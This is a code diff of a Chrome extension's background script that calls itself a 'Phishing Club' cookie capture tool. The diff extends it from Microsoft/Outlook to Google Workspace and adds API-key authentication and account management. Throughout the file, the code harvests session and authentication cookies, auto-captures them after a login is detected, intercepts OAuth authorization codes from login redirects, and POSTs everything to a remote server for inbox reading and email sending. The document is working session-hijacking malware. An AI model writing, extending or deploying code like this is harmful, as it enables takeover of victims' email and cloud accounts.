@@ -1,48 +1,97 @@
 /**
  * Phishing Club — Cookie Capture Extension (Background Service Worker)
+ * v1.0.43 — API key auth, Google Workspace support, multi-account management
  *
- * Captures Microsoft/Outlook session cookies from the browser and sends them
- * to the Phishing Club server's cookie store for inbox reading and email sending.
+ * Captures Microsoft/Outlook and Google Workspace session cookies from the
+ * browser and sends them to the Phishing Club server's cookie store.
  *
  * Endpoints used:
- *   GET  /api/extension/ping           — Health check
- *   POST /api/extension/cookies/save   — Send captured cookies to cookie store
- *   POST /api/extension/oauth/callback — Send captured OAuth codes
+ *   GET  /api/extension/ping              — Health check
+ *   POST /api/extension/cookies/save      — Send captured cookies (legacy)
+ *   POST /api/extension/cookies/save-v2   — Send with provider + account metadata
+ *   POST /api/extension/oauth/callback    — Send captured OAuth codes
  */
 
-const COOKIE_URLS = [
-  'https://outlook.live.com/',
-  'https://outlook.office365.com/',
-  'https://outlook.office.com/',
-  'https://login.live.com/',
-  'https://login.microsoftonline.com/',
-  'https://account.live.com/',
-  'https://www.office.com/',
-  'https://office365.com/',
-  'https://m365.cloud.microsoft.com/',
-  'https://substrate.office.com/',
-  'https://live.com/',
-];
+// ── Provider Definitions ────────────────────────────────────────────────────
 
-const CRITICAL_COOKIES = [
-  'X-OWA-CANARY', 'ClientId', 'UC', 'cadata', 'OutlookSession',
-  'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
-  'WLSSC', 'MSPAuth', 'MSPProf', 'MSPSoftVis',
-  'MSRT', 'MSPRequ',
-  'MSPOK', 'MSCC', 'OIDCAuthCookie',
-  'SignInStateCookie',
+const PROVIDERS = {
+  microsoft: {
+    name: 'Microsoft',
+    cookieUrls: [
+      'https://outlook.live.com/',
+      'https://outlook.office365.com/',
+      'https://outlook.office.com/',
+      'https://login.live.com/',
+      'https://login.microsoftonline.com/',
+      'https://account.live.com/',
+      'https://www.office.com/',
+      'https://office365.com/',
+      'https://m365.cloud.microsoft.com/',
+      'https://substrate.office.com/',
+      'https://live.com/',
+    ],
+    criticalCookies: [
+      'X-OWA-CANARY', 'ClientId', 'UC', 'cadata', 'OutlookSession',
+      'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
+      'WLSSC', 'MSPAuth', 'MSPProf', 'MSPSoftVis',
+      'MSRT', 'MSPRequ',
+      'MSPOK', 'MSCC', 'OIDCAuthCookie',
+      'SignInStateCookie',
+    ],
+    authCookies: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'WLSSC', 'MSPAuth'],
+    loginPatterns: [
+      'https://outlook.live.com/mail/',
+      'https://outlook.office365.com/mail/',
+      'https://outlook.office.com/mail/',
+      'https://outlook.live.com/owa/',
+      'https://outlook.office365.com/owa/',
+    ],
+  },
+  google: {
+    name: 'Google Workspace',
+    cookieUrls: [
+      'https://mail.google.com/',
+      'https://accounts.google.com/',
+      'https://myaccount.google.com/',
+      'https://www.google.com/',
+      'https://workspace.google.com/',
+      'https://admin.google.com/',
+      'https://drive.google.com/',
+      'https://calendar.google.com/',
+    ],
+    criticalCookies: [
+      'SID', 'HSID', 'SSID', 'APISID', 'SAPISID',
+      'OSID', 'LSID', '__Secure-1PSID', '__Secure-3PSID',
+      '__Secure-1PAPISID', '__Secure-3PAPISID',
+      'NID', 'SIDCC', '__Secure-1PSIDCC', '__Secure-3PSIDCC',
+      'COMPASS', 'GX',
+    ],
+    authCookies: ['SID', 'HSID', 'SSID', '__Secure-1PSID', '__Secure-3PSID'],
+    loginPatterns: [
+      'https://mail.google.com/mail/',
+      'https://workspace.google.com/',
+      'https://admin.google.com/',
+    ],
+  },
+};
+
+// Combine all cookie URLs for backward compatibility
+const COOKIE_URLS = [
+  ...PROVIDERS.microsoft.cookieUrls,
+  ...PROVIDERS.google.cookieUrls,
 ];
 
 const OAUTH_DOMAINS = [
   'login.microsoftonline.com',
   'login.live.com',
-  'account.live.com'
+  'account.live.com',
+  'accounts.google.com',
 ];
 
 const OAUTH_REDIRECT_PATTERNS = [
   'https://login.microsoftonline.com/common/oauth2/nativeclient',
   'https://login.live.com/oauth20_desktop.srf',
-  'http://localhost'
+  'http://localhost',
 ];
 
 let serverConnected = false;
@@ -50,7 +99,7 @@ let serverConnected = false;
 // ── Extension installed ─────────────────────────────────────────────────────
 
 chrome.runtime.onInstalled.addListener(() => {
-  console.log('[PhishingClub] Cookie Capture extension installed');
+  console.log('[PhishingClub] Cookie Capture extension v1.0.43 installed');
 
   chrome.storage.local.set({
     enabled: true,
@@ -59,14 +108,17 @@ chrome.runtime.onInstalled.addListener(() => {
     notifications: true,
     capturedTokens: [],
     capturedCookies: [],
-    serverUrl: ''
+    serverUrl: '',
+    apiKey: '',
+    activeProvider: 'microsoft',
+    accounts: [],
   });
 
   chrome.notifications.create({
     type: 'basic',
     iconUrl: 'icons/icon128.png',
     title: 'Phishing Club - Cookie Capture',
-    message: 'Extension installed! Enter your server URL in the popup to connect.'
+    message: 'Extension installed! Enter your server URL and API key in the popup to connect.',
   });
 });
 
@@ -75,32 +127,33 @@ chrome.runtime.onInstalled.addListener(() => {
 chrome.tabs.onUpdated.addListener((tabId, changeInfo) => {
   if (changeInfo.url) {
     checkForOAuthCode(changeInfo.url, tabId);
-    checkForOutlookLogin(changeInfo.url, tabId);
+    checkForLoginRedirect(changeInfo.url, tabId);
   }
 });
 
 chrome.webRequest.onBeforeRequest.addListener(
   (details) => checkForOAuthCode(details.url, details.tabId),
-  { urls: ['https://login.microsoftonline.com/*', 'https://login.live.com/*', 'https://account.live.com/*'] }
+  { urls: [
+    'https://login.microsoftonline.com/*',
+    'https://login.live.com/*',
+    'https://account.live.com/*',
+    'https://accounts.google.com/*',
+  ] }
 );
 
-// ── Auto-capture after Outlook login detection ─────────────────────────────
+// ── Auto-capture after login detection (Microsoft + Google) ───────────────
 
-async function checkForOutlookLogin(url, tabId) {
+async function checkForLoginRedirect(url, tabId) {
   try {
-    const settings = await chrome.storage.local.get(['enabled', 'autoCaptureOnLogin', 'serverUrl']);
+    const settings = await chrome.storage.local.get(['enabled', 'autoCaptureOnLogin', 'serverUrl', 'activeProvider']);
     if (!settings.enabled || !settings.autoCaptureOnLogin || !settings.serverUrl) return;
 
-    const outlookPatterns = [
-      'https://outlook.live.com/mail/',
-      'https://outlook.office365.com/mail/',
-      'https://outlook.office.com/mail/',
-      'https://outlook.live.com/owa/',
-      'https://outlook.office365.com/owa/',
-    ];
+    const provider = settings.activeProvider || 'microsoft';
+    const providerConfig = PROVIDERS[provider];
+    if (!providerConfig) return;
 
-    const isOutlookMail = outlookPatterns.some(p => url.startsWith(p));
-    if (!isOutlookMail) return;
+    const isLoginRedirect = providerConfig.loginPatterns.some(p => url.startsWith(p));
+    if (!isLoginRedirect) return;
 
     const lastCapture = await chrome.storage.local.get(['lastAutoCapture']);
     const now = Date.now();
@@ -109,8 +162,8 @@ async function checkForOutlookLogin(url, tabId) {
     await chrome.storage.local.set({ lastAutoCapture: now });
 
     setTimeout(async () => {
-      console.log('[PhishingClub] Auto-capturing cookies after Outlook login detected');
-      const result = await captureCookies();
+      console.log(`[PhishingClub] Auto-capturing ${provider} cookies after login detected`);
+      const result = await captureCookiesForProvider(provider);
       if (result.success) {
         chrome.action.setBadgeText({ text: String(result.count) });
         chrome.action.setBadgeBackgroundColor({ color: '#4CAF50' });
@@ -137,7 +190,7 @@ async function checkForOAuthCode(url, tabId) {
     const code = urlObj.searchParams.get('code') || extractFromHash(urlObj.hash, 'code');
     if (!code) return;
 
-    const settings = await chrome.storage.local.get(['enabled', 'autoCapture', 'notifications', 'serverUrl']);
+    const settings = await chrome.storage.local.get(['enabled', 'autoCapture', 'notifications', 'serverUrl', 'apiKey']);
     if (!settings.enabled) return;
 
     console.log('[PhishingClub] OAuth code captured:', code.substring(0, 30) + '...');
@@ -155,7 +208,7 @@ async function checkForOAuthCode(url, tabId) {
     await saveToken(tokenData);
 
     if (settings.autoCapture && settings.serverUrl) {
-      const result = await sendOAuthToServer(settings.serverUrl, tokenData);
+      const result = await sendOAuthToServer(settings.serverUrl, settings.apiKey, tokenData);
       tokenData.sent = result.success;
       await updateLastTokenStatus(result.success);
     }
@@ -170,7 +223,7 @@ async function checkForOAuthCode(url, tabId) {
           : settings.serverUrl
             ? 'Code captured but could not send to server. Check connection.'
             : 'Code captured! Set your server URL in the popup to auto-send.',
-        priority: 2
+        priority: 2,
       });
     }
 
@@ -188,13 +241,18 @@ function extractFromHash(hash, key) {
   return new URLSearchParams(hash.substring(1)).get(key);
 }
 
-// ── Cookie Capture Engine ───────────────────────────────────────────────────
+// ── Cookie Capture Engine (provider-aware) ─────────────────────────────────
 
-async function captureCookies() {
+async function captureCookiesForProvider(provider) {
+  const providerConfig = PROVIDERS[provider];
+  if (!providerConfig) {
+    return { success: false, count: 0, error: `Unknown provider: ${provider}` };
+  }
+
   const allCookies = [];
   const seenKeys = new Set();
 
-  for (const url of COOKIE_URLS) {
+  for (const url of providerConfig.cookieUrls) {
     try {
       const cookies = await chrome.cookies.getAll({ url });
       for (const cookie of cookies) {
@@ -220,13 +278,15 @@ async function captureCookies() {
   }
 
   if (allCookies.length === 0) {
-    return { success: false, count: 0, error: 'No Outlook cookies found. Are you signed into Outlook in this browser?' };
+    return {
+      success: false,
+      count: 0,
+      error: `No ${providerConfig.name} cookies found. Are you signed in?`,
+    };
   }
 
-  const foundCritical = allCookies.filter(c => CRITICAL_COOKIES.includes(c.name));
-  const hasCriticalAuth = foundCritical.some(c =>
-    ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'WLSSC', 'MSPAuth'].includes(c.name)
-  );
+  const foundCritical = allCookies.filter(c => providerConfig.criticalCookies.includes(c.name));
+  const hasCriticalAuth = foundCritical.some(c => providerConfig.authCookies.includes(c.name));
 
   const domainGroups = {};
   for (const c of allCookies) {
@@ -243,6 +303,7 @@ async function captureCookies() {
     totalCount: allCookies.length,
     criticalCount: foundCritical.length,
     hasCriticalAuth,
+    provider,
     sent: false,
   };
 
@@ -252,11 +313,18 @@ async function captureCookies() {
   if (captures.length > 20) captures.splice(20);
   await chrome.storage.local.set({ capturedCookies: captures });
 
-  console.log(`[PhishingClub] Captured ${allCookies.length} cookies (${foundCritical.length} critical) from ${Object.keys(domainGroups).length} domains`);
+  console.log(`[PhishingClub] Captured ${allCookies.length} ${provider} cookies (${foundCritical.length} critical) from ${Object.keys(domainGroups).length} domains`);
 
-  const settings = await chrome.storage.local.get(['autoCapture', 'serverUrl', 'notifications']);
+  const settings = await chrome.storage.local.get(['autoCapture', 'serverUrl', 'apiKey', 'notifications', 'accounts']);
   if (settings.autoCapture && settings.serverUrl) {
-    const sendResult = await sendCookiesToServer(settings.serverUrl, captureEntry);
+    // Find active account name for this provider
+    const accounts = settings.accounts || [];
+    const activeAccount = accounts.find(a => a.provider === provider && a.active);
+    const accountName = activeAccount ? activeAccount.name : '';
+
+    const sendResult = await sendCookiesToServerV2(
+      settings.serverUrl, settings.apiKey, captureEntry, provider, accountName
+    );
     captureEntry.sent = sendResult.success;
     const updated = await chrome.storage.local.get(['capturedCookies']);
     const list = updated.capturedCookies || [];
@@ -272,7 +340,7 @@ async function captureCookies() {
     chrome.notifications.create({
       type: 'basic',
       iconUrl: 'icons/icon128.png',
-      title: captureEntry.sent ? 'Cookies Sent to Server!' : 'Cookies Captured',
+      title: captureEntry.sent ? `${providerConfig.name} Cookies Sent!` : `${providerConfig.name} Cookies Captured`,
       message: `${allCookies.length} cookies from ${Object.keys(domainGroups).length} domains. ${authStatus}.`,
       priority: 2,
     });
@@ -285,19 +353,76 @@ async function captureCookies() {
     hasCriticalAuth,
     domains: Object.keys(domainGroups),
     sent: captureEntry.sent,
+    provider,
   };
 }
 
-// ── HTTP: Send captured cookies to Phishing Club ────────────────────────────
+// Legacy wrapper for backward compatibility
+async function captureCookies() {
+  const settings = await chrome.storage.local.get(['activeProvider']);
+  return captureCookiesForProvider(settings.activeProvider || 'microsoft');
+}
 
+// ── HTTP helpers ────────────────────────────────────────────────────────────
+
+function buildHeaders(apiKey) {
+  const headers = { 'Content-Type': 'application/json' };
+  if (apiKey) {
+    headers['X-Extension-API-Key'] = apiKey;
+  }
+  return headers;
+}
+
+// ── HTTP: Send captured cookies (v2 with provider + account) ────────────────
+
+async function sendCookiesToServerV2(serverUrl, apiKey, cookieData, provider, accountName) {
+  const base = serverUrl.replace(/\/+$/, '');
+  const saveUrl = `${base}/api/extension/cookies/save-v2`;
+
+  try {
+    const resp = await fetch(saveUrl, {
+      method: 'POST',
+      headers: buildHeaders(apiKey),
+      body: JSON.stringify({
+        cookies: cookieData.cookies,
+        timestamp: cookieData.timestamp,
+        domains: Object.keys(cookieData.domainGroups || {}),
+        totalCount: cookieData.totalCount,
+        provider: provider || 'microsoft',
+        accountName: accountName || '',
+      }),
+    });
+
+    if (!resp.ok) {
+      const text = await resp.text();
+      console.error('[PhishingClub] Cookie save-v2 returned', resp.status, text);
+      return { success: false, error: `Server returned ${resp.status}` };
+    }
+
+    const result = await resp.json();
+    console.log('[PhishingClub] Cookie save-v2 response:', result);
+    return {
+      success: result.success === true,
+      message: result.message,
+      cookieStoreId: result.cookieStoreId || '',
+      provider: result.provider || provider,
+    };
+  } catch (err) {
+    console.error('[PhishingClub] sendCookiesToServerV2 failed:', err.message);
+    return { success: false, error: err.message };
+  }
+}
+
+// Legacy send (backward compatibility)
 async function sendCookiesToServer(serverUrl, cookieData) {
+  const settings = await chrome.storage.local.get(['apiKey']);
   const base = serverUrl.replace(/\/+$/, '');
   const saveUrl = `${base}/api/extension/cookies/save`;
 
   try {
     const resp = await fetch(saveUrl, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: buildHeaders(settings.apiKey),
       body: JSON.stringify({
         cookies: cookieData.cookies,
         timestamp: cookieData.timestamp,
@@ -327,14 +452,14 @@ async function sendCookiesToServer(serverUrl, cookieData) {
 
 // ── HTTP: Send OAuth code to Phishing Club ──────────────────────────────────
 
-async function sendOAuthToServer(serverUrl, tokenData) {
+async function sendOAuthToServer(serverUrl, apiKey, tokenData) {
   const base = serverUrl.replace(/\/+$/, '');
   const callbackUrl = `${base}/api/extension/oauth/callback`;
 
   try {
     const resp = await fetch(callbackUrl, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: buildHeaders(apiKey),
       body: JSON.stringify({ code: tokenData.code, state: tokenData.state }),
     });
 
@@ -354,12 +479,15 @@ async function sendOAuthToServer(serverUrl, tokenData) {
 
 // ── HTTP: Test server connection ────────────────────────────────────────────
 
-async function testConnection(serverUrl) {
+async function testConnection(serverUrl, apiKey) {
   const base = serverUrl.replace(/\/+$/, '');
   const pingUrl = `${base}/api/extension/ping`;
 
   try {
-    const resp = await fetch(pingUrl, { method: 'GET' });
+    const resp = await fetch(pingUrl, {
+      method: 'GET',
+      headers: apiKey ? { 'X-Extension-API-Key': apiKey } : {},
+    });
     if (!resp.ok) {
       serverConnected = false;
       return { success: false, error: `Server returned ${resp.status}` };
@@ -397,9 +525,12 @@ async function updateLastTokenStatus(sent) {
 chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
 
   if (request.action === 'getSettings') {
-    chrome.storage.local.get(['enabled', 'autoCapture', 'autoCaptureOnLogin', 'notifications', 'serverUrl'], (r) => {
-      sendResponse({ ...r, connected: serverConnected });
-    });
+    chrome.storage.local.get(
+      ['enabled', 'autoCapture', 'autoCaptureOnLogin', 'notifications', 'serverUrl', 'apiKey', 'activeProvider', 'accounts'],
+      (r) => {
+        sendResponse({ ...r, connected: serverConnected });
+      }
+    );
     return true;
   }
 
@@ -409,14 +540,15 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
   }
 
   if (request.action === 'testConnection') {
-    testConnection(request.serverUrl)
+    testConnection(request.serverUrl, request.apiKey)
       .then(r => sendResponse(r))
       .catch(e => sendResponse({ success: false, error: e.message }));
     return true;
   }
 
   if (request.action === 'captureCookies') {
-    captureCookies()
+    const provider = request.provider || 'microsoft';
+    captureCookiesForProvider(provider)
       .then(r => sendResponse(r))
       .catch(e => sendResponse({ success: false, error: e.message }));
     return true;
@@ -454,11 +586,58 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
   }
 
   if (request.action === 'sendToken') {
-    sendOAuthToServer(request.serverUrl, request.tokenData)
-      .then(r => sendResponse(r))
-      .catch(e => sendResponse({ success: false, error: e.message }));
+    chrome.storage.local.get(['apiKey'], (settings) => {
+      sendOAuthToServer(request.serverUrl, settings.apiKey, request.tokenData)
+        .then(r => sendResponse(r))
+        .catch(e => sendResponse({ success: false, error: e.message }));
+    });
+    return true;
+  }
+
+  // v1.0.43: Account management
+  if (request.action === 'addAccount') {
+    chrome.storage.local.get(['accounts'], (r) => {
+      const accounts = r.accounts || [];
+      const newAccount = {
+        id: Date.now().toString(36),
+        name: request.account.name,
+        provider: request.account.provider,
+        active: accounts.filter(a => a.provider === request.account.provider).length === 0,
+        createdAt: new Date().toISOString(),
+      };
+      accounts.push(newAccount);
+      chrome.storage.local.set({ accounts }, () => sendResponse({ success: true, account: newAccount }));
+    });
+    return true;
+  }
+
+  if (request.action === 'removeAccount') {
+    chrome.storage.local.get(['accounts'], (r) => {
+      const accounts = (r.accounts || []).filter(a => a.id !== request.accountId);
+      chrome.storage.local.set({ accounts }, () => sendResponse({ success: true }));
+    });
+    return true;
+  }
+
+  if (request.action === 'setActiveAccount') {
+    chrome.storage.local.get(['accounts'], (r) => {
+      const accounts = r.accounts || [];
+      for (const a of accounts) {
+        if (a.provider === request.provider) {
+          a.active = a.id === request.accountId;
+        }
+      }
+      chrome.storage.local.set({ accounts }, () => sendResponse({ success: true }));
+    });
+    return true;
+  }
+
+  if (request.action === 'getAccounts') {
+    chrome.storage.local.get(['accounts'], (r) => {
+      sendResponse({ accounts: r.accounts || [] });
+    });
     return true;
   }
 });
 
-console.log('[PhishingClub] Cookie Capture extension — background script loaded');
+console.log('[PhishingClub] Cookie Capture extension v1.0.43 — background script loaded');
